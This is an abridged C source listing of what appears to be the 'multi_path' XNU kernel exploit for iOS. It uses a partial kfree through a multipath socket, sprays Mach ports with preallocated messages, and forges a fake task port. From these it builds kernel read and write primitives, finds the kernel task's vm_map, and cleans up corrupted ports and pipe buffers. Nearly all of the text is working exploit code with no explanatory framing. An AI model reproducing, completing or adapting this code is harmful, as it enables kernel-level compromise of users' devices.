...
void do_partial_kfree_with_socket(int fd, uint64_t kaddr, uint32_t n_bytes) {
  ...
  *(uint64_t*) (((uint8_t*)sockaddr_src)+multi_path_koffset(KFREE_ADDR_OFFSET)) = kaddr;
  sockaddr_src->sa_len = multi_path_koffset(KFREE_ADDR_OFFSET)+n_bytes;
  ...
  eps.sae_srcaddrlen = multi_path_koffset(KFREE_ADDR_OFFSET)+n_bytes;
...
void build_fake_task_port(uint8_t* fake_port, uint64_t fake_port_kaddr, uint64_t initial_read_addr, uint64_t vm_map, uint64_t receiver) {
  ...
  *(uint32_t*)(fake_port+multi_path_koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS)) = IO_BITS_ACTIVE | IKOT_TASK;
  *(uint32_t*)(fake_port+multi_path_koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES)) = 0xf00d; // leak references
  *(uint32_t*)(fake_port+multi_path_koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS)) = 0xf00d; // leak srights
  *(uint64_t*)(fake_port+multi_path_koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER)) = receiver;
  *(uint64_t*)(fake_port+multi_path_koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT)) = 0x123456789abcdef;
  
  
  uint64_t fake_task_kaddr = fake_port_kaddr + 0x100;
  *(uint64_t*)(fake_port+multi_path_koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) = fake_task_kaddr;
  
  uint8_t* fake_task = fake_port + 0x100;
  
  // set the ref_count field of the fake task:
  *(uint32_t*)(fake_task + multi_path_koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d; // leak references
  
  // make sure the task is active
  *(uint32_t*)(fake_task + multi_path_koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;
  
  // set the vm_map of the fake task:
  *(uint64_t*)(fake_task + multi_path_koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;
  
  // set the task lock type of the fake task's lock:
  *(uint8_t*)(fake_task + multi_path_koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
  
  // set the bsd_info pointer to be 0x10 bytes before the desired initial read:
  *(uint64_t*)(fake_task + multi_path_koffset(KSTRUCT_OFFSET_TASK_BSD_INFO)) = initial_read_addr - 0x10;
}
...
mach_port_t multi_path_prealloc_port(natural_t size) {
...
void* multi_path_do_thread(void* arg) {
...
void multi_path_send_prealloc_msg(mach_port_t port) {
  // start a new thread passing it the buffer and the exception port
  pthread_t t;
  pthread_create(&t, NULL, multi_path_do_thread, (void*)port);
  ...
  printf("set context\n");
    ...
    extern int port_has_message(mach_port_t port);
...
mach_port_t multi_path_receive_prealloc_msg(mach_port_t port) {
  kern_return_t err = mach_msg_server_once(exc_server,
                                           sizeof(union max_msg),
                                           port,
                                           MACH_MSG_TIMEOUT_NONE);
  
  printf("multi_path_receive_prealloc_msg: %s\n", mach_error_string(err));
...
mach_port_t prepare_early_read_primitive(uint64_t pipe_buffer_kaddr, int pipe_read_end, int pipe_write_end, mach_port_t replacer_port, uint8_t* original_contents) {
  ...
  *((uint64_t*)(original_contents+0x66c)) = fake_port_kaddr;
  ...
  early_read_port = multi_path_receive_prealloc_msg(replacer_port);
...
void multi_path_wk32(uint64_t kaddr, uint32_t val) {
...
void multi_path_wk64(uint64_t kaddr, uint64_t val) {
  uint32_t lower = (uint32_t)(val & 0xffffffff);
  uint32_t higher = (uint32_t)(val >> 32);
  multi_path_wk32(kaddr, lower);
  multi_path_wk32(kaddr+4, higher);
}

uint32_t multi_path_rk32(uint64_t kaddr) {
  kern_return_t err;
  uint32_t val = 0;
...
uint64_t multi_path_rk64(uint64_t kaddr) {
  uint64_t lower = multi_path_rk32(kaddr);
  uint64_t higher = multi_path_rk32(kaddr+4);
  uint64_t full = ((higher<<32) | lower);
  return full;
}

uint64_t task_port_kaddr;
kern_return_t multi_path_go() {
    
    kern_return_t ret = KERN_SUCCESS;
    multi_path_offsets_init();
    ...
    extern void prepare_prealloc_port(mach_port_t port);
    mach_port_t exception_ports[100];
    for (int i = 0; i < 100; i++) {
    mach_port_t p = multi_path_prealloc_port(0x800);
    ...
    for (int i = 0; i < 100; i++) {
    multi_path_send_prealloc_msg(exception_ports[i]);
    ...
    if (memcmp(original_contents, new_contents, PIPE_SIZE) == 0) {
      ...
      mach_port_t fake_thread_port = multi_path_receive_prealloc_msg(exception_ports[i]);
    ...
    uint64_t ipc_space_kernel = early_rk64(host_port_kaddr + multi_path_koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
    ...
    uint32_t io_bits = early_rk32(early_port_kaddr + multi_path_koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS));
    ...
    uint64_t task_t = early_rk64(early_port_kaddr + multi_path_koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    if (task_t == 0) {
    ...
    uint64_t bsd_info = early_rk64(task_t + multi_path_koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
    if (bsd_info == 0) {
      printf("task doesn't have a bsd info\n");
      continue;
    }
    uint32_t pid = early_rk32(bsd_info + multi_path_koffset(KSTRUCT_OFFSET_PROC_PID));
    if (pid != 0) {
      printf("task isn't the kernel task\n");
    }

    // found the right task, get the vm_map
    kernel_vm_map = early_rk64(task_t + multi_path_koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
    break;
    }
    ...
    uint64_t task_kaddr = multi_path_rk64(task_port_kaddr + multi_path_koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t itk_space = multi_path_rk64(task_kaddr + multi_path_koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t is_table = multi_path_rk64(itk_space + multi_path_koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));

    uint32_t is_table_size = multi_path_rk32(itk_space + multi_path_koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE_SIZE));

    const int sizeof_ipc_entry_t = 0x18;
    for (uint32_t i = 0; i < is_table_size; i++) {
    uint64_t port_kaddr = multi_path_rk64(is_table + (i * sizeof_ipc_entry_t));
    ...
    uint64_t kmsg = multi_path_rk64(port_kaddr + multi_path_koffset(KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE));
    if (kmsg == pipe_buf) {
      // neuter it:
      printf("clearing kmsg from port %016llx\n", port_kaddr);
      multi_path_wk64(port_kaddr + multi_path_koffset(KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE), 0);
      multi_path_wk32(port_kaddr + multi_path_koffset(KSTRUCT_OFFSET_IPC_PORT_MSG_COUNT), 0x50000);
    }

    // check for a prealloced msg:
    uint32_t ip_bits = multi_path_rk32(port_kaddr + multi_path_koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS));
    #define  IP_BIT_PREALLOC    0x00008000
    if (ip_bits & IP_BIT_PREALLOC) {
      uint64_t premsg = multi_path_rk64(port_kaddr + multi_path_koffset(KSTRUCT_OFFSET_IPC_PORT_IP_PREMSG));
      if (premsg == pipe_buf) {
        // clear the premsg:
        printf("clearing premsg from port %016llx\n", port_kaddr);
        multi_path_wk64(port_kaddr + multi_path_koffset(KSTRUCT_OFFSET_IPC_PORT_IP_PREMSG), 0);
        ip_bits &= (~IP_BIT_PREALLOC);
        multi_path_wk32(port_kaddr + multi_path_koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), ip_bits);
      }
    }
    }
    ...
    // struct proc:
    uint64_t proc_addr = multi_path_rk64(task_kaddr + multi_path_koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));

    // struct filedesc
    uint64_t filedesc = multi_path_rk64(proc_addr + multi_path_koffset(KSTRUCT_OFFSET_PROC_P_FD));

    // base of ofiles array
    uint64_t ofiles_base = multi_path_rk64(filedesc + multi_path_koffset(KSTRUCT_OFFSET_FILEDESC_FD_OFILES));

    uint64_t ofiles_offset = ofiles_base + (replacer_pipe * 8);

    // struct fileproc
    uint64_t fileproc = multi_path_rk64(ofiles_offset);

    // struct fileglob
    uint64_t fileglob = multi_path_rk64(fileproc + multi_path_koffset(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));

    // struct pipe
    uint64_t pipe = multi_path_rk64(fileglob + multi_path_koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));

    // clear the inline struct pipebuf
    printf("clearing pipebuf: %llx\n", pipe);
    multi_path_wk64(pipe + 0x00, 0);
    multi_path_wk64(pipe + 0x08, 0);
    multi_path_wk64(pipe + 0x10, 0);

    // do the same for the other end:
    ofiles_offset = ofiles_base + ((replacer_pipe+1) * 8);

    // struct fileproc
    fileproc = multi_path_rk64(ofiles_offset);

    // struct fileglob
    fileglob = multi_path_rk64(fileproc + multi_path_koffset(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));

    // struct pipe
    pipe = multi_path_rk64(fileglob + multi_path_koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
